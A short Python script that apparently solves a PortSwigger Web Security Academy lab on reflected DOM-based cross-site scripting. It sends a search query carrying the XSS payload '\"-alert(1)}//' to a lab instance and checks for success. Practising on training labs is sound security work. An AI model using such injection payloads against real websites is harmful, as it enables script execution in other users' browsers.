#https://portswigger.net/web-security/cross-site-scripting/dom-based/lab-dom-xss-reflected

from utils import *

url="https://0ab400200426187f854d186700b8007e.web-security-academy.net/"
payload='?search=\"-alert(1)}//'

response=requests.get(url+payload)

print(check_succes(parse_html(response)))
